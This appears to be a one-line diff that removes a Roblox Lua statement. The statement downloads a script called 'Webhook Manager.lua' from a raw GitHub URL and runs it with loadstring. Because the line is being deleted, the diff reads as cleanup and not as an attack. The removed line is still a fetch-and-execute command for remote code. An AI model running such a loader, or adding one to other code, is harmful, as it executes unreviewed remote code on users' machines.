@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/kooggy/Scripts/main/Webhook%20Manager.lua"))()
